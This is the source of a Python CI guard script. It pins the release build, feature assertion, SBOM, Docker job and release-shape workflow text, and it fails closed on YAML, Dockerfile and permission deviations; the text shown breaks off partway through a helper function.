#!/usr/bin/env python3
# Copyright 2026 AlphaOne LLC
# SPDX-License-Identifier: Apache-2.0
"""Release feature-set guard (#4480, hardened by #4719).

THE DEFECT CLASS. A shipped artifact lacks a capability its docs advertise:
release.yml built ``--features sal`` only, so the advertised PostgreSQL + AGE +
pgvector tier was absent from every release binary (#4480, the #2676 / #2728 /
#3996 class). The durable control is ONE declaration (scripts/release-features.sh)
and a check that the build, the assertion, the SBOM, the image, the proof job
and the docs all follow it, and that a BROKEN declaration fails the build
instead of silently degrading it.

DESIGN: AN ALLOWLIST OF TEXT *AND* OF POSITION. The units that decide what
ships are compared to their EXACT expected text, after normalising only runs
of spaces/tabs; anything else is refused. Line continuations are not modelled:
a run line ending in ``\\`` is refused in release.yml and release-shape.yml, and
in the Dockerfile the ONLY continued lines allowed are those of the canonical
build RUN, which is compared physical line by physical line
(``DOCKER_RUN_LINES``). The units are:

  * the release.yml build step, the strict-assert step, the SBOM step and the
    release-shape build step (statement lists, below);
  * the Dockerfile builder ``RUN`` (one instruction string).

Pinning the text alone is not enough: a unit can be copied into a position
that never runs (a YAML block scalar, a dead Docker stage, a decoy job) while
the unit that does run is changed, or the values GitHub substitutes into the
pinned text (``${{ matrix.* }}``) can carry shell. So the guard also pins WHERE
each unit is and WHAT is substituted into it:

  * Workflows are read with a strict, fail-closed YAML SUBSET parser (stdlib
    only, no PyYAML). It accepts ``key:``, ``key: value`` (a one-line plain,
    quoted or flow-sequence value), ``key: |`` / ``|-`` / ``>`` / ``>-`` and
    ``- `` sequence items whose first key sits exactly two columns after the
    dash, with ONE indentation per mapping. It refuses every line it cannot
    explain: tabs, a line more indented than its mapping or sequence (a
    multi-line scalar or a stray key), quoted or complex keys, duplicate keys,
    anchors, aliases, tags, flow mappings, multi-line quoted scalars, block
    indentation indicators. A block scalar is allowed ONLY as a step ``run:``
    or a step ``with:`` value, so ``name: |`` cannot hide steps.
  * The units are located structurally: top-level ``jobs:`` -> ``release:`` ->
    its ``steps:`` list (build, then strict assert, exactly one of each),
    ``jobs:`` -> ``sbom:`` -> ``steps:`` (exactly one SBOM step; a second
    ``cargo ... cyclonedx`` anywhere in release.yml is refused), and the
    release-shape ``jobs:`` -> ``release-shape:`` -> ``steps:``.
  * The release job SKELETON is pinned: its key set is exactly ``JOB_KEYS``,
    ``runs-on`` is exactly ``${{ matrix.os }}``, and ``strategy`` is exactly
    ``fail-fast: false`` plus ``matrix: include:`` entries whose keys are
    ``target``/``os``/``artifact`` (+ ``nfpm_arch``) and whose values are
    unquoted literals matching a strict pattern (no expression, quote, space or
    shell metacharacter: they are substituted into the pinned build and assert
    text before bash runs); an ``os`` value is exactly one of ``HOSTED_RUNNERS``
    (Round 6: no ``self-hosted``). The target set itself is pinned (``RELEASE_TARGETS``):
    a legitimate matrix change updates that constant in the same commit. This
    pin is deliberate: an exact skeleton is cheaper to keep correct than an
    open-ended list of job keys that can skip, redirect or neutralise the
    assert (``if:``, ``env:``, ``defaults:``, ``container:``,
    ``continue-on-error:``...). A pinned step ``name:`` must not carry ``${{``.
  * In the release job no step other than the canonical build may mention
    ``cargo``, ``rustc``, ``cross`` or ``cargo-zigbuild`` (any case, any option
    order, any ``+toolchain``), and in the whole of release.yml at most one
    line runs one of them against ``matrix.target``. This is a REFUSAL, not
    tracking: it does not prove the uploaded file is the asserted one (#4752).
  * Dockerfile: line 1 must be exactly ``# syntax=docker/dockerfile:1`` and no
    other parser directive (``escape``, ``check``, a second ``syntax``) may
    appear anywhere; heredocs (``<<``), ``SHELL``, ``ONBUILD`` and unknown
    instructions are refused. Stages are parsed: the final stage must COPY the
    binary exactly once, from a NAMED earlier stage, and take nothing else
    ``--from`` another stage or image; that stage (the builder) must not start
    FROM another stage nor COPY ``--from``, must COPY Cargo.lock, and must end
    with exactly the declaration COPY followed by the canonical RUN. ``cargo``
    (and the other build tools) anywhere else in the Dockerfile is refused, read
    with quote and backslash characters removed. Every line ending in ``\\``
    outside the canonical RUN is refused, and the canonical RUN's lines must be
    exactly ``DOCKER_RUN_LINES`` (no comment or blank line inside, no re-indent).
    A ``FROM`` image containing ``$`` is refused (a build-arg base the guard
    cannot resolve), and ``--mount`` is refused anywhere in an instruction (a
    mount can import files the guard never read). Instructions are split as
    BuildKit splits them (``bk_instructions``: a ``\\`` with only spaces/tabs
    after it continues, the next line is appended as written). That join is
    checked against recorded parser outputs (the PARITY table, from the
    moby/buildkit v0.23.2 parser) and a differential fuzz, but the guard does
    not RELY on it matching every BuildKit input: it refuses every continuation
    it would have to join, except the one pinned line by line.
  * The ``docker:`` job is pinned WHOLE, because it holds ``packages: write``:
    its keys are exactly ``name``/``needs``/``if``/``runs-on``/``permissions``/
    ``steps`` with pinned values (``DOCKER_JOB``; a job ``env:``, ``container:``,
    ``defaults:``, ``services:`` or ``strategy:`` is refused), and its steps are
    exactly the pinned ordered list (``DOCKER_STEPS``: checkout, Buildx setup,
    registry login, version, image build, provenance attestation), each with its
    exact keys, its ``uses`` pinned to a SHA constant, its ``with:`` inputs and
    its run text. No step can be added, removed, reordered or changed.
  * Permissions, secrets and the registry. The top-level ``permissions:`` is
    exactly ``contents: write`` and every job's ``permissions:`` is pinned
    (``RELEASE_JOB_PERMISSIONS``; ``packages: write`` exists in the docker job
    only); the job set is pinned and no job may call a reusable workflow. Every
    ``secrets`` reference must be ``secrets.<NAME>`` with NAME in
    ``RELEASE_SECRETS`` and no key may be named ``secrets``. The registry host
    (``ghcr.io``, any case) may appear only inside the docker job.
  * Quoting. A double-quoted YAML scalar containing a backslash is refused (YAML
    decodes escapes such as ``\\x63`` that this parser would read raw); a
    single-quoted ``''`` is decoded to ``'`` as YAML does. The build-tool scans
    (release job, whole release.yml, Dockerfile) read the text with quote and
    backslash characters removed (``c''argo`` reads as ``cargo``). That is a
    best-effort spelling view for REFUSALS only; it cannot see a name built by
    expansion (#4752, #4768).
  * release-shape.yml is pinned as a skeleton: its top-level keys in order
    (``SHAPE_TOP_KEYS``), the ``on:`` triggers (``SHAPE_ON``, branch and path
    filters included), ``permissions:`` (``SHAPE_PERMISSIONS``) and ``env:``
    (exactly the two ``CARGO_*`` values, ``SHAPE_ENV``); exactly one job,
    ``release-shape:``, whose keys are exactly ``name``/``runs-on``/
    ``timeout-minutes``/``steps`` with pinned values (``SHAPE_JOB``), so no job
    ``needs:``, ``if:``, ``env:``, ``defaults:``, ``container:`` or
    ``services:``. ``continue-on-error`` follows ``SHAPE_ADVISORY``: while it is
    True (the #4480 ruling: advisory until the first green run on main) the job
    must carry exactly the plain ``continue-on-error: true``; when #4720 flips it
    to False the key is refused. The Postgres proof is located structurally:
    exactly one ``run`` step whose statements equal the pinned
    ``bash scripts/release-shape-pg-proof.sh target/release/ai-memory "$url"``
    (the URL assignment may change its port only), with the step key set pinned
    (so no step ``if:`` or ``continue-on-error:``), ordered after the
    release-shaped build. The ``paths:`` trigger filter is NOT evidence.

PIN MAINTENANCE. Every pin-mismatch message names the constant to update and
this file. A Dependabot SHA bump of a docker-job action fails with ONE message
naming its ``*_USES`` constant: update that constant to the new SHA in the same
commit (the rest of the step is still compared). Any other intended change to a
pinned unit is made the same way, in the workflow and here, in one commit.

Whole-line comments are dropped; a trailing ``#`` is NOT trusted (the statement
then differs from the allowed one and is refused). ``BASH_ENV`` is refused
anywhere in release.yml, release-shape.yml and the Dockerfile. Control
characters (CR, form feed, NUL...), NBSP and every other Unicode space or zero-width character in the
workflows or Dockerfile are refused, never folded: Python, YAML and bash
disagree on what a line and a blank are.

OUT OF SCOPE (tracked): the shipped file differing from the asserted one
(#4752), another step or Dockerfile instruction poisoning the environment or
rewriting the declaration before the allowed units run (#4768).

Exit codes: 0 = guard passes, 1 = guard failure (or self-test / sweep failure),
2 = usage error or unreadable input (non-UTF-8, a directory or a symlink loop
where a file belongs). A guard that cannot parse its input fails closed.

Usage:
  scripts/check_release_features.py [repo-root]
  scripts/check_release_features.py --self-test
  scripts/check_release_features.py --mutation-sweep [repo-root]
"""
from __future__ import annotations

import argparse
import ast
import fnmatch
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Callable, Dict, Iterable, Iterator, List, Optional, Tuple, Union

HERE = Path(__file__).resolve().parent

ALLOWED_FEATURES = 'FEATURES="$(bash scripts/release-features.sh)"'
ALLOWED_REQUIRE = 'REQUIRE_FLAGS="$(bash scripts/release-features.sh --require-flags)"'
ALLOWED_BIN = 'bin="target/${{ matrix.target }}/release/${{ matrix.artifact }}"'
ASSERT_WORKFLOW = 'bash scripts/assert-compiled-features.sh "$bin" --strict $REQUIRE_FLAGS'
ASSERT_DOCKER = "bash scripts/assert-compiled-features.sh target/release/ai-memory --strict $REQUIRE_FLAGS"
BUILD_CMD = 'cargo build --locked --release --target ${{ matrix.target }} --features "$FEATURES"'
SHAPE_BUILD_CMD = 'cargo build --locked --release --features "$FEATURES"'
SBOM_CMD = 'cargo cyclonedx --format json --features "$FEATURES"'

# The exact statements (after normalisation) of each unit that decides what ships.
WF_BUILD = ("set -euo pipefail", ALLOWED_FEATURES, 'test -n "$FEATURES"', BUILD_CMD)
WF_ASSERT = ("set -euo pipefail", ALLOWED_BIN, ALLOWED_REQUIRE, 'test -n "$REQUIRE_FLAGS"', ASSERT_WORKFLOW)
WF_SBOM = (
    "set -euo pipefail",
    'SOURCE_DATE_EPOCH="$(git log -1 --format=%ct)"',
    "export SOURCE_DATE_EPOCH",
    ALLOWED_FEATURES,
    'test -n "$FEATURES"',
    SBOM_CMD,
    "mkdir -p dist",
    "cp ai-memory.cdx.json dist/",
    "cd dist",
    "sha256sum ai-memory.cdx.json > ai-memory.cdx.json.sha256",
    "ls -la ai-memory.cdx.json*",
)
SHAPE_BUILD = ("set -euo pipefail", ALLOWED_FEATURES, 'test -n "$FEATURES"', SHAPE_BUILD_CMD)
DOCKER_RUN = (
    "RUN set -eu; "
    + ALLOWED_FEATURES + "; "
    + ALLOWED_REQUIRE + "; "
    + 'test -n "$FEATURES"; test -n "$REQUIRE_FLAGS"; '
    + SHAPE_BUILD_CMD + "; "
    + "strip target/release/ai-memory; "
    + ASSERT_DOCKER
)
# The ONLY `\` continuation the guard accepts anywhere: the canonical build RUN,
# compared physical line by physical line (#4719 C-1/C-2). Any other line that
# ends in `\` (Dockerfile, or release.yml / release-shape.yml run text) is refused.
DOCKER_RUN_LINES = (
    "RUN set -eu; \\",
    "    " + ALLOWED_FEATURES + "; \\",
    "    " + ALLOWED_REQUIRE + "; \\",
    '    test -n "$FEATURES"; \\',
    '    test -n "$REQUIRE_FLAGS"; \\',
    "    " + SHAPE_BUILD_CMD + "; \\",
    "    strip target/release/ai-memory; \\",
    "    " + ASSERT_DOCKER,
)
SHAPE_PROOF_CMD = 'bash scripts/release-shape-pg-proof.sh target/release/ai-memory "$url"'
SHAPE_PROOF_URL = "url=<the TLS verify-full proof URL>"
SHAPE_PROOF = ("set -euo pipefail", SHAPE_PROOF_URL, SHAPE_PROOF_CMD)
SHAPE_URL_RE = re.compile(
    r'url="postgres://postgres:\$\{PGTLS_PW\}@127\.0\.0\.1:[0-9]+/proof\?sslmode=verify-full'
    r'&sslrootcert=\$\{PGTLS_DIR\}/ca\.crt"')
GUARD_PATH = "scripts/check_release_features.py"


class Flow(str):
    """A pinned flow-sequence value, compared by its text between the brackets."""


class Double(str):
    """A pinned double-quoted scalar (no backslash: the parser refuses one)."""


class Block(tuple):
    """A pinned ``|`` literal block, compared line by line."""


# Pinned YAML: str = plain scalar, Flow / Double = that style, Block = `|` lines,
# dict = a mapping with exactly these keys, list = a sequence of exactly these
# items, None = a key with no value.
Spec = Union[str, Flow, Double, Block, Dict[str, object], List[object], None]

# The docker job is pinned WHOLE (#4719 SR-8/SR-9): it holds `packages: write`,
# so anything it runs can put an image on the release tag. Every action is pinned
# to its SHA; a Dependabot bump of one of these SHAs fails with one message that
# names the constant to update.
CHECKOUT_USES = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
BUILDX_USES = "docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f"
LOGIN_USES = "docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9"
IMAGE_BUILD_USES = "docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8"
ATTEST_USES = "actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be"
USES_CONSTANTS = {
    CHECKOUT_USES: "CHECKOUT_USES",
    BUILDX_USES: "BUILDX_USES",
    LOGIN_USES: "LOGIN_USES",
    IMAGE_BUILD_USES: "IMAGE_BUILD_USES",
    ATTEST_USES: "ATTEST_USES",
}
# #8030: the action each constant pins, so every `uses:` of that action is compared to it.
USES_BY_ACTION = {const.split("@", 1)[0]: const for const in USES_CONSTANTS}
DOCKER_JOB: Dict[str, Spec] = {
    "name": "Docker (GHCR)",
    "needs": Flow("preflight, qualify, supply-chain"),
    "if": "needs.preflight.outputs.is_prerelease == 'false'",
    "runs-on": "ubuntu-latest",
    "permissions": {"contents": "read", "packages": "write", "id-token": "write", "attestations": "write"},
}
DOCKER_STEPS: List[Spec] = [
    {"uses": CHECKOUT_USES, "with": {"ref": "${{ needs.preflight.outputs.sha }}"}},
    {"name": "Set up Docker Buildx", "uses": BUILDX_USES},
    {"name": "Log in to GitHub Container Registry", "uses": LOGIN_USES,
     "with": {"registry": "ghcr.io", "username": "${{ github.actor }}", "password": "${{ secrets.GITHUB_TOKEN }}"}},
    {"name": "Extract version from tag", "id": "version", "run": 'echo "version=${TAG#v}" >> "$GITHUB_OUTPUT"',
     "env": {"TAG": "${{ needs.preflight.outputs.tag }}"}},
    {"name": "Build and push Docker image", "id": "build", "uses": IMAGE_BUILD_USES, "with": {
        "context": ".",
        "push": "${{ github.event.inputs.dry_run == 'false' }}",
        "tags": Block((
            "ghcr.io/${{ github.repository_owner }}/ai-memory:${{ steps.version.outputs.version }}",
            "ghcr.io/${{ github.repository_owner }}/ai-memory:latest",
        )),
        "labels": Block((
            "org.opencontainers.image.source=https://github.com/${{ github.repository }}",
            "org.opencontainers.image.version=${{ steps.version.outputs.version }}",
        )),
        "cache-from": "type=gha",
        "cache-to": "type=gha,mode=max",
    }},
    {"name": "Attest build provenance (Docker image)", "if": "github.event.inputs.dry_run == 'false'",
     "uses": ATTEST_USES, "with": {
         "subject-name": "ghcr.io/${{ github.repository_owner }}/ai-memory",
         "subject-digest": "${{ steps.build.outputs.digest }}",
         "push-to-registry": "true",
     }},
]
# What each pinned docker step is, for the messages.
DOCKER_STEP_ROLES = ("checkout", "Buildx setup", "registry login", "version", "image build", "provenance attestation")
# release.yml permissions, pinned per job (#4719 SR-8): `packages: write` exists in
# the docker job only; None = the job declares none and inherits the top level.
RELEASE_TOP_PERMISSIONS: Dict[str, Spec] = {"contents": "write"}
_SIGN = {"contents": "write", "id-token": "write", "attestations": "write"}
_READ_ATTEST = {"contents": "read", "attestations": "read"}
RELEASE_JOB_PERMISSIONS: Dict[str, Optional[Dict[str, Spec]]] = {
    "preflight": {"contents": "read"},
    "qualify": {"contents": "read", "checks": "read", "actions": "read"},
    "supply-chain": None,
    "release": dict(_SIGN),
    "sbom": dict(_SIGN),
    "mobile-ios": dict(_SIGN),
    "mobile-android": dict(_SIGN),
    "crates-io": None,
    "homebrew": dict(_READ_ATTEST),
    "docker": dict(DOCKER_JOB["permissions"]),  # type: ignore[arg-type]
    "copr": dict(_READ_ATTEST),
}
# Every job's `needs:` edges, pinned (#6289): a publish job that dropped its
# supply-chain / release gate would run before (or without) it. preflight is the
# root and carries no `needs:`; docker reuses its whole-job pin.
_PQS = Flow("preflight, qualify, supply-chain")
_PQR = Flow("preflight, qualify, release")
RELEASE_JOB_NEEDS: Dict[str, Spec] = {
    "qualify": "preflight",
    "supply-chain": Flow("preflight, qualify"),
    "release": _PQS,
    "sbom": _PQS,
    "mobile-ios": _PQS,
    "mobile-android": _PQS,
    "crates-io": _PQR,
    "homebrew": _PQR,
    "docker": DOCKER_JOB["needs"],
    "copr": _PQR,
}
# The only secrets release.yml may read: a new credential (a registry token in
# another job) is refused until it is added here on purpose.
RELEASE_SECRETS = ("GITHUB_TOKEN", "CARGO_REGISTRY_TOKEN", "HOMEBREW_TAP_TOKEN", "COPR_CONFIG")
SECRET_REF_RE = re.compile(r"(?<![\w.-])secrets(?![\w-])(?P<ref>\s*\.\s*(?P<name>[A-Za-z_][A-Za-z0-9_]*))?", re.I)
# The image registry is named only inside the pinned docker job.
REGISTRY = "ghcr.io"
# release-shape.yml skeleton (#4719 SR-10).
SHAPE_TOP_KEYS = ("name", "on", "permissions", "concurrency", "env", "jobs")
SHAPE_PERMISSIONS: Dict[str, Spec] = {"contents": "read"}
SHAPE_ENV: Dict[str, Spec] = {"CARGO_TERM_COLOR": "always", "CARGO_INCREMENTAL": Double("0")}
SHAPE_PATHS = (
    ".github/workflows/release.yml", ".github/workflows/release-shape.yml", "scripts/release-features.sh",
    "scripts/check_release_features.py", "scripts/release-shape-pg-proof.sh", "scripts/assert-compiled-features.sh",
    "Cargo.toml", "Cargo.lock", "src/**", "migrations/**",
)
SHAPE_ON: Dict[str, Spec] = {
    "pull_request": {"branches": Flow('"release/**", "rehearsal/**", "chain/**", "main"'), "paths": [Double(p) for p in SHAPE_PATHS]},
    "push": {"branches": Flow('"release/**"')},
    "workflow_dispatch": None,
}
SHAPE_JOB: Dict[str, Spec] = {
    "name": Double("Release-shaped build + PG TLS proof"),
    "runs-on": "ubuntu-latest",
    "timeout-minutes": "60",
}


class Unit(str):
    """A SHAPE_STEPS slot filled by a statement-list unit (SHAPE_BUILD / SHAPE_PROOF)."""


# #6290: the release-shape job's ordered step list is pinned WHOLE. The build and
# proof slots are the statement-list units; every other step is compared key by
# key, so no step carries an `if:`, `continue-on-error:` or `timeout-minutes:` the
# list does not pin (only the cleanup step runs `if: always()`), and none can be
# added, dropped or reordered.
SHAPE_STEPS: List[Spec] = [
    {"uses": CHECKOUT_USES},
    {"name": "Install Rust 1.98.0 (matches rust-toolchain.toml pin)", "uses": "dtolnay/rust-toolchain@f8be11a05b1d4f3fcebe6410cc16743212b999b0"},
    {"uses": "Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6"},
    {"name": "Release feature declaration guard", "run": "python3 scripts/check_release_features.py"},
    Unit("build"),
    {"name": "No OpenSSL / libpq / native-tls in the shipped dependency graph", "shell": "bash",
     "run": Block((
         'set -euo pipefail',
         'FEATURES="$(bash scripts/release-features.sh)"',
         'test -n "$FEATURES"',
         'tree="$(cargo tree --locked -e normal --target all --features "$FEATURES")"',
         'if printf \'%s\\n\' "$tree" | grep -E \'(^|[^a-z-])(openssl-sys|native-tls|openssl |libpq)\'; then',
         '  echo "::error::the release feature set pulls a native TLS / libpq dependency (#4480 requires pure-Rust rustls)"',
         '  exit 1',
         'fi',
         'echo "no openssl-sys / native-tls / libpq in the release dependency graph"',
     ))},
    {"name": "Start a TLS PostgreSQL service (throwaway CA, hostssl-only)", "shell": "bash",
     "run": Block((
         'set -euo pipefail',
         'd="$RUNNER_TEMP/pgtls"',
         'mkdir -p "$d"',
         'cd "$d"',
         'openssl req -x509 -newkey rsa:2048 -nodes -days 1 -subj "/CN=release-shape-ca" -keyout ca.key -out ca.crt',
         'openssl req -newkey rsa:2048 -nodes -subj "/CN=127.0.0.1" -keyout server.key -out server.csr',
         "printf 'subjectAltName=IP:127.0.0.1,DNS:localhost\\n' > san.ext",
         'openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 1 -extfile san.ext -out server.crt',
         '# hostssl ONLY on TCP: a plaintext login cannot succeed, so a green',
         '# round trip proves the session was TLS.',
         "printf 'local all all trust\\nhostssl all all all scram-sha-256\\n' > pg_hba.conf",
         'sudo chown 999:999 server.key server.crt pg_hba.conf',
         'sudo chmod 600 server.key',
         'pw="$(openssl rand -hex 16)"',
         'echo "::add-mask::$pw"',
         'echo "PGTLS_DIR=$d" >> "$GITHUB_ENV"',
         'echo "PGTLS_PW=$pw" >> "$GITHUB_ENV"',
         '# Image: pgvector/pgvector 0.8.7-pg18 (canonical PostgreSQL 18.6 + pgvector 0.8.7',
         '# stack of the repo SSOT), pinned by digest; no Apache AGE in this image.',
         'docker run -d --name release-shape-pg -p 127.0.0.1:55432:5432 -e POSTGRES_PASSWORD="$pw" -e POSTGRES_DB=proof -v "$d:/certs:ro" pgvector/pgvector@sha256:2358fcba361ed2233a5ed81b5fe4ca779ccb304120ce531a3bf51c0ed7e2bc11 -c ssl=on -c ssl_cert_file=/certs/server.crt -c ssl_key_file=/certs/server.key -c hba_file=/certs/pg_hba.conf',
         'for _ in $(seq 1 60); do',
         '  if docker exec release-shape-pg pg_isready -U postgres -d proof >/dev/null 2>&1; then',
         '    ready=1; break',
         '  fi',
         '  sleep 2',
         'done',
         'if [ "${ready:-0}" != 1 ]; then',
         '  docker logs release-shape-pg || true',
         '  echo "::error::the TLS PostgreSQL service did not become ready (the proof must not pass vacuously)"',
         '  exit 1',
         'fi',
         "docker exec release-shape-pg psql -U postgres -d proof -v ON_ERROR_STOP=1 -c 'CREATE EXTENSION IF NOT EXISTS vector;'",
     ))},
    Unit("proof"),
    {"name": "Stop the PostgreSQL service", "if": "always()", "shell": "bash",
     "run": "docker rm -f release-shape-pg >/dev/null 2>&1 || true"},
]
SHAPE_STEP_ROLES = ("checkout", "toolchain", "build cache", "feature declaration guard", "release-shaped build",
                    "native TLS check", "TLS PostgreSQL service", "PG proof", "PostgreSQL cleanup")
# #4480 ruled the release-shape job ADVISORY until its first green run on main; #4720
# tracks the flip to required. While True the job must carry exactly the plain
# `continue-on-error: true`; the #4720 fix sets this to False in the same commit
# that drops the key from release-shape.yml, after which the key is refused.
SHAPE_ADVISORY = True
DOCKER_SYNTAX = "# syntax=docker/dockerfile:1"
DOCKER_DECL_COPY = "COPY scripts/release-features.sh scripts/release-features.sh"
DOCKER_LOCK_COPY = "COPY Cargo.toml Cargo.lock ./"
DOCKER_INSTRUCTIONS = frozenset((
    "FROM", "RUN", "CMD", "LABEL", "EXPOSE", "ENV", "ADD", "COPY", "ENTRYPOINT",
    "VOLUME", "USER", "WORKDIR", "ARG", "STOPSIGNAL", "HEALTHCHECK",
))

KEYS_SHELL = ("name", "shell", "run")
KEYS_PLAIN = ("name", "run")
TOP_KEYS = ("name", "on", "permissions", "concurrency", "jobs")
RELEASE_JOBS = tuple(RELEASE_JOB_PERMISSIONS)
JOB_KEYS = ("name", "needs", "runs-on", "permissions", "strategy", "steps")
SBOM_JOB_KEYS = ("name", "needs", "runs-on", "permissions", "steps")
RELEASE_RUNS_ON = "${{ matrix.os }}"
# The release matrix. Every value is substituted textually into the pinned
# build / assert units before bash runs, so each one is a strict literal.
RELEASE_TARGETS = (
    "x86_64-unknown-linux-gnu",
    "aarch64-unknown-linux-gnu",
    "x86_64-apple-darwin",
    "aarch64-apple-darwin",
)
MATRIX_REQUIRED = ("target", "os", "artifact")
# Round 6 (security 3 and 4): a runner is one GitHub-hosted label. The values release.yml uses (ubuntu-latest,
# ubuntu-24.04-arm, macos-15-intel, macos-latest) plus the pinned siblings; `self-hosted` and any expression are refused.
HOSTED_RUNNERS = ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04", "ubuntu-24.04-arm", "macos-latest", "macos-14",
                  "macos-15", "macos-15-intel", "windows-latest")

MATRIX_VALUE_RE = {
    "target": re.compile(r"[a-z0-9_]+(?:-[a-z0-9_]+){2,3}"),
    "os": re.compile("|".join(re.escape(r) for r in HOSTED_RUNNERS)),
    "artifact": re.compile(r"ai-memory"),
    "nfpm_arch": re.compile(r"[a-z0-9_]+"),
}

# A build tool word: any case (macOS runners resolve `CARGO` on a case-insensitive
# file system), not part of a longer word, option or file name (`Cargo.toml`).
BUILD_TOOL_RE = re.compile(r"(?<![\w.-])(?:cargo-zigbuild|cargo|rustc|cross)(?![\w.-])", re.I)
SBOM_TOOL_RE = re.compile(r"(?<![\w-])cargo(?![\w-]).*?\scyclonedx(?![\w-])", re.I)
# Quote and backslash characters bash removes inside a word (`c''argo`, `ca\rgo`).
QUOTE_RE = re.compile(r"['\"\\]")
INLINE_USE_RE = re.compile(r"\$\(\s*bash [^)]*release-features\.sh|`\s*bash [^`]*release-features\.sh")
# C0/C1 controls (tab excepted: the YAML parser refuses it itself), every Unicode
# space other than U+0020 (NBSP, ogham, en/em..., narrow NBSP, math space,
# ideographic), zero-width characters and the BOM, line/paragraph separators.
CONTROL_RE = re.compile(
    r"[\x00-\x08\x0b-\x1f\x7f-\x9f\u00a0\u1680\u180e\u2000-\u200f\u2028-\u202f\u205f-\u2064\u3000\ufeff]"
)
KEY_RE = re.compile(r"(?P<key>[A-Za-z_][A-Za-z0-9_-]*):(?: +(?P<val>.*))?")
ITEM_RE = re.compile(r"-(?P<sp> *)(?P<rest>.*)")
BLOCK_INDICATORS = ("|", "|-", ">", ">-")
_TAIL = r"(?:[ ]+#.*)?"
_FLOW_ITEM = r"(?:\"[^\"\\]*\"|'[^']*'|[^\s\[\]{},'\"#&*!|>%@`][^\[\]{},#]*?)"
SCALAR_FORMS = (
    ("double", re.compile(r'(?P<v>"(?:[^"\\]|\\.)*")' + _TAIL)),
    ("single", re.compile(r"(?P<v>'(?:[^']|'')*')" + _TAIL)),
    ("flow", re.compile(r"(?P<v>\[ *(?:" + _FLOW_ITEM + r"(?: *, *" + _FLOW_ITEM + r")*)? *\])" + _TAIL)),
    ("plain", re.compile(r"(?P<v>(?:[^\s&*!{}\[\]|>%@`#,'\"?:-]|[-?:](?=\S))(?:(?!: |:$| #).)*?)" + _TAIL)),
)
FROM_RE = re.compile(r"FROM(?: --platform=\S+)? (?P<image>\S+)(?: AS (?P<name>[A-Za-z][A-Za-z0-9_.-]*))?", re.I)
BINARY_COPY_RE = re.compile(r"COPY --from=(?P<stage>\S+) /build/target/release/ai-memory /usr/local/bin/ai-memory")
FROM_FLAG_RE = re.compile(r"--from=(?P<src>\S+)", re.I)
BK_CONT_RE = re.compile(r"(^|[^\\])\\[ \t]*$")  # BuildKit lineContinuationRegex for the default escape `\`
DIRECTIVE_RE = re.compile(r"^[ \t]*#[ \t]*(?:syntax|escape|check)[ \t]*=", re.I)


# ------------------------------------------------------------ text helpers --
def indent_of(line: str) -> int:
    return len(line) - len(line.lstrip(" "))


def is_blank_or_comment(line: str) -> bool:
    s = line.strip(" \t")
    return not s or s.startswith("#")


def _collapse(text: str) -> str:
    """Runs of spaces/tabs collapsed, ends stripped (ONLY spaces and tabs: any
    other Unicode space is refused by CONTROL_RE, never folded)."""
    return re.sub(r"[ \t]+", " ", text).strip(" ")


def bk_instructions(lines: List[str]) -> List[Tuple[int, int, str]]:
    """The BuildKit (v0.23 parser) instructions of a Dockerfile as (first line,
    last line, text), 1-based. A physical line continues iff it matches
    BK_CONT_RE; the ``\\`` and its trailing spaces/tabs are removed and the next
    line is appended AS WRITTEN (its leading whitespace kept, so ``RUN ca\\`` +
    ``rgo`` is ``RUN cargo``). Inside a continuation a whole-line comment is
    dropped and a blank line skipped; outside one both are skipped. End of file
    inside a continuation emits what was read, even when it is empty, as
    BuildKit does. The text is then collapsed."""
    out: List[Tuple[int, int, str]] = []
    buf: Optional[str] = None
    start = 0
    for n, raw in enumerate(lines, 1):
        s = raw.strip(" \t")
        if not s or s.startswith("#"):
            continue
        if buf is None:
            start, piece = n, raw.lstrip(" \t")
        else:
            piece = raw
        m = BK_CONT_RE.search(piece)
        if m is not None:
            buf = (buf or "") + piece[: m.start()] + m.group(1)
            continue
        out.append((start, n, _collapse((buf or "") + piece)))
        buf = None
    if buf is not None:
        out.append((start, len(lines), _collapse(buf)))
    return out


def logical_lines(lines: List[str], buildkit: bool = False) -> List[str]:
    """Normalise to logical lines, collapsed (see _collapse). NOTHING else is
    interpreted: a trailing ``#`` stays in the line.

    DOCKERFILE text (``buildkit=True``) is joined exactly as BuildKit joins it
    (bk_instructions). SHELL text (``buildkit=False``) is joined as bash joins
    it: only a line ending in an ODD number of backslashes with nothing after
    them continues; one backslash is removed and the next line is appended as
    written. Outside a continuation whole-line comments and blanks are dropped;
    inside one a comment line is KEPT (it can only add refusals) and a blank
    line ends the command. The guard refuses every continued line outside the
    canonical Dockerfile RUN, so these joins only have to be exact, not lenient."""
    if buildkit:
        return [text for _, _, text in bk_instructions(lines)]
    out: List[str] = []
    buf: Optional[str] = None
    for raw in lines:
        s = raw.strip(" \t")
        if buf is None and (not s or s.startswith("#")):
            continue
        if buf is not None and not s:
            if _collapse(buf):
                out.append(_collapse(buf))
            buf = None
            continue
        cur = (buf or "") + raw
        if (len(raw) - len(raw.rstrip("\\"))) % 2 == 1:
            buf = cur[:-1]
            continue
        out.append(_collapse(cur))
        buf = None
    if buf is not None and _collapse(buf):
        out.append(_collapse(buf))
    return out


def continued_lines(lines: List[str]) -> List[int]:
    """1-based numbers of the lines that end in ``\\`` (trailing spaces/tabs
    ignored): every one a reader might join to the next line."""
    return [n for n, raw in enumerate(lines, 1) if raw.rstrip(" \t").endswith("\\")]


def continuation_noise(lines: List[str]) -> List[int]:
    """1-based numbers of the blank and whole-line comment lines that sit inside an
    open BuildKit continuation (BuildKit drops them silently). Used by the parity
    self-checks; the guard itself refuses the continuation."""
    noise: List[int] = []
    open_ = False
    for n, raw in enumerate(lines, 1):
        s = raw.strip(" \t")
        if not s or s.startswith("#"):
            if open_:
                noise.append(n)
            continue
        open_ = BK_CONT_RE.search(raw) is not None
    return noise


def first_diff(got: Tuple[str, ...], want: Tuple[str, ...]) -> str:
    """Name the first statement where ``got`` and ``want`` differ."""
    n = max(len(got), len(want))
